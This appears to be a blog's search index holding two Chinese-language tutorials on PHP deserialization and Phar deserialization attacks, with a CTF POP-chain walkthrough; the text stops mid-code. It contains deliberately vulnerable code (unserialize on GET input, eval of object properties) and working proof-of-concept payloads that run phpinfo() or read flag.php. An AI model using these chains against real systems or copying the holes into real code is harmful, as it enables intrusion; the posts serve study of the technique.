<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP反序列化总结（一）</title>
    <url>/2020/10/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、魔术方法"><a href="#一、魔术方法" class="headerlink" title="一、魔术方法"></a>一、魔术方法</h1><h2 id="1、列举"><a href="#1、列举" class="headerlink" title="1、列举"></a>1、列举</h2><p>__wakeup() //使用unserialize时触发<br>__sleep()//使用serialize时触发<br>__destruct() //对象被销毁时触发<br>__call() //在对象上下文中调用不可访问的方法时触发<br>__callStatic()//在静态上下文中调用不可访问的方法时触发<br>__get() //用于从不可访问的属性读取数据<br>__set() //用于将数据写入不可访问的属性<br>__isset()//在不可访问的属性上调用isset()或empty()触发<br>__unset()//在不可访问的属性上使用unset()时触发<br>__toString()//把类当作字符串使用时触发<br>__invoke()//当脚本尝试将对象调用为函数时触发</p>
<h2 id="2、执行顺序"><a href="#2、执行顺序" class="headerlink" title="2、执行顺序"></a>2、执行顺序</h2><p>new了一个对象，对象被执行，执行_construct<br>construct run<br>serialize了对一个对象，对象被序列化，先执行_sleep，再序列化<br>sleep run<br>unserialize了一个序列化字符串，对象被反序列化，先反序列化，再执行 _wakeup<br>把Test这个对象当做字符串使用了，执行_toString<br>toString run<br>程序执行完毕，对象自动销毁，执行_destruct<br>destruct rundestruct run</p>
<h1 id="二、魔术方法的具体应用"><a href="#二、魔术方法的具体应用" class="headerlink" title="二、魔术方法的具体应用"></a>二、魔术方法的具体应用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    private <span class="variable">$name</span> = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__construct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;\n__destruct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;__toString() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__sleep() call\n&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> array(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__wakeup() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __get(<span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__get() call\n&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __set(<span class="variable">$property</span>, <span class="variable">$value</span>)</span><br><span class="line">    &#123;   <span class="built_in">echo</span> <span class="string">&quot;\n__set() call\n&quot;</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="variable">$property</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__invoke() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//调用 __construct()</span><br><span class="line"><span class="variable">$a</span> = new A();</span><br><span class="line"></span><br><span class="line">//调用 __toSting()</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">//调用 __sleep()</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">//调用 __wakeup()</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">//调用 __get()</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>-&gt;bbbb;</span><br><span class="line"></span><br><span class="line">//调用 __set()</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="string">&quot;pro&quot;</span>;//name属性是私有的无法直接访问</span><br><span class="line"></span><br><span class="line">//调用 __invoke()</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">//调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span><br></pre></td></tr></table></figure>

<p><img src="/images/web/php1.png" alt="direct"></p>
<p>补充：<br>可以看到最后调用两次__destruct()魔术方法，第一个是new一个对象后，在序列化后，该对象结束调用 __destruct()魔术方法 ，之后又进行了一次反序列化重新变为对象，直到最后程序结束，对象消失，再调用一次__destruct()魔术方法 。</p>
<p>遇到反序列化构造POP链的问题，可以配置Xdebug进行断点调试。</p>
<h1 id="三、例子"><a href="#三、例子" class="headerlink" title="三、例子"></a>三、例子</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析：这里只有一个A类，只有一个__wakeup()方法，并且一旦反序列化会走魔法方法__wakeup并且输出test，那我们就将A类序列化输出<br>POC：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = new A();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/web/php2.png" alt="direct"><br>这样就算触发成功</p>
<h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><p>如果__wakeup中不是echo $this-&gt;test;,是eval(*)那么就是任意代码执行危害巨大</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;<span class="built_in">test</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>原来的poc改一下，就可以<br>?test=O:1:”A”:1:{s:4:”test”;s:10:”phpinfo();”;}<br>如下<br><img src="/images/web/2.png" alt="direct"></p>
<h2 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h2><p>当漏洞/危险代码存在在类的普通方法中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class maniac&#123;</span><br><span class="line">        public <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span> =new x1();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">class x1&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">action</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;x1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class x2&#123;</span><br><span class="line">    public <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">action</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class2</span>  = new maniac();</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析：通过代码发现$_GET[‘test’]可控,因为使用unserialize()会自动调用__destruct()，所以他会先调用action()函数,然后会走到x1类和x2类，而安全问题在x2类中<br>POC：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class maniac&#123;</span><br><span class="line">        public <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span> = new x2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class x2&#123;</span><br><span class="line">        public <span class="variable">$test2</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$class1</span> = new maniac();</span><br><span class="line">    print_r(serialize(<span class="variable">$class1</span>))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/web/3.png" alt="direct"></p>
<h1 id="四、题目"><a href="#四、题目" class="headerlink" title="四、题目"></a>四、题目</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is <span class="keyword">in</span> flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line">    public <span class="keyword">function</span> file_get(<span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;file_get(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">source</span>.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;<span class="built_in">source</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _show()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            die(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="variable">$this</span>-&gt;<span class="built_in">source</span>); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$p</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = new Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：<br>对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，<br>Read类有file_get_contents()函数，<br>Show类有highlight_file()函数可以读取文件。<br>接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发__wakeup魔术方法，而__wakeup魔术方法可以看到在Show类中。</p>
<h3 id="1、-wakeup方法"><a href="#1、-wakeup方法" class="headerlink" title="1、__wakeup方法"></a>1、__wakeup方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的__tostring方法，通篇看下代码发现__tostring魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发__tostring方法。</p>
<h3 id="2、-tostring方法"><a href="#2、-tostring方法" class="headerlink" title="2、__tostring方法"></a>2、__tostring方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;<span class="built_in">source</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先找到str这个数组，取出key值为str的value值赋给source，那么如果这个value值不存在的话就会触发__get魔术方法。再次通读全篇，看到Test类中存在__get魔术方法。</p>
<h3 id="3、-get方法"><a href="#3、-get方法" class="headerlink" title="3、__get方法"></a>3、__get方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __get(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现先取Test类中的属性p给function变量，再通过return $function()把它当作函数执行，这里属性p可控。这样就会触发__invoke魔术方法，而__invoke魔术方法存在于Read类中。</p>
<h3 id="4、-invoke方法"><a href="#4、-invoke方法" class="headerlink" title="4、__invoke方法"></a>4、__invoke方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;file_get(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可。</p>
<h3 id="5、exp思路"><a href="#5、exp思路" class="headerlink" title="5、exp思路"></a>5、exp思路</h3><p>pop链<br>unserialize函数（变量可控）–&gt;__wakeup()魔术方法–&gt;__tostring()魔术方法–&gt;__get魔术方法–&gt;__invoke魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php<br>hello接收参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Read&#123;</span><br><span class="line">    public <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$s</span> = new Show();</span><br><span class="line"><span class="variable">$t</span> = new Test();</span><br><span class="line"><span class="variable">$r</span> = new Read();</span><br><span class="line"><span class="variable">$t</span>-&gt;p = <span class="variable">$r</span>;   //赋值Test类的对象(<span class="variable">$t</span>)下的属性p为Read类的对象(<span class="variable">$r</span>)，触发__invoke魔术方法</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&quot;str&quot;</span>] = <span class="variable">$t</span>;//赋值Show类的对象(<span class="variable">$s</span>)下的str数组的str键的值为 Test类的对象<span class="variable">$t</span> ，触发__get魔术方法。</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="built_in">source</span> = <span class="variable">$s</span>;//令 Show类的对象(<span class="variable">$s</span>)下的<span class="built_in">source</span>属性值为此时上一步已经赋值过的<span class="variable">$s</span>对象，从而把对象当作字符串调用触发__tostring魔术方法。</span><br><span class="line">var_dump(serialize(<span class="variable">$s</span>));</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Phar反序列化利用</title>
    <url>/2020/10/22/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、phar结构"><a href="#一、phar结构" class="headerlink" title="一、phar结构"></a>一、phar结构</h2><p>翻阅手册可以知道，phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)，以下是对详细的介绍：</p>
<h3 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h3><p>标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar。</p>
<h3 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h3><p>phar文件实质上是一种压缩文件，其中压缩信息、权限等都在这一部分里。当然，我们所需的攻击利用点meta-data序列化信息也在这一部分中。具体结构如图所示<br><img src="/images/web/phar1.png" alt="direct"></p>
<h3 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h3><p>被压缩的文件</p>
<h3 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h3><p>签名放在文件末尾</p>
<h2 id="二、测试"><a href="#二、测试" class="headerlink" title="二、测试"></a>二、测试</h2><h3 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h3><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类。<br>注意：需要将php.ini中的phar.readonly设置成off。</p>
<p>首先我们拥有一个 file_un.php 内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;cck&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析：这里有一个__destruct()的方法，对象在销毁时调用它，此时要注意__construct()的方法和__destruct()的方法的区别<br>__construct的方法在对象被创建时就会调用<br><img src="/images/web/phar2.jpg" alt="direct"><br>打印出来的内容为<br><img src="/images/web/phar3.jpg" alt="direct"><br>而当为__destruct()时<br><img src="/images/web/phar4.jpg" alt="direct"><br>打印出来的内容为<br><img src="/images/web/phar5.jpg" alt="direct"></p>
<p>于是构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;cck&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = new AnyClass();</span><br><span class="line"><span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当对其访问时，会生成一个 phar的文件<br><img src="/images/web/phar6.jpg" alt="direct"></p>
<h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p>而 phar://伪协议解析phar文件时对meta-data进行反序列化操作通过</p>
<p>于是通过file_un.php文件进行访问<br><img src="/images/web/phar7.png" alt="direct"><br>此时变成功</p>
<h3 id="CTF实例题目"><a href="#CTF实例题目" class="headerlink" title="CTF实例题目"></a>CTF实例题目</h3><p>如图所示<br><img src="/images/web/phar8.png" alt="direct"><br>查看源码，有类，有上传，有文件读取，很明显的phar反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$id</span>;</span><br><span class="line">    public <span class="variable">$age</span>=null;</span><br><span class="line">    public <span class="variable">$nickname</span>=null;</span><br><span class="line">    public <span class="variable">$backup</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">login</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mysqli</span>=new dbCtrl();</span><br><span class="line">        <span class="variable">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;login();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;id)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=1;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你的ID是&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你好！&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">upload</span></span>()&#123;</span><br><span class="line">        <span class="variable">$uploader</span>=new Upload();</span><br><span class="line">        <span class="variable">$uploader</span>-&gt;upload();</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">read</span></span>()&#123;</span><br><span class="line">        <span class="variable">$reader</span>=new reader();</span><br><span class="line">        <span class="variable">$reader</span>-&gt;<span class="built_in">read</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;nickname-&gt;backup=<span class="variable">$this</span>-&gt;backup;</span><br><span class="line">        <span class="variable">$user</span> = new User();</span><br><span class="line">        <span class="variable">$user</span>-&gt;id = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$user</span>-&gt;nickname = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="built_in">return</span> serialize(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public <span 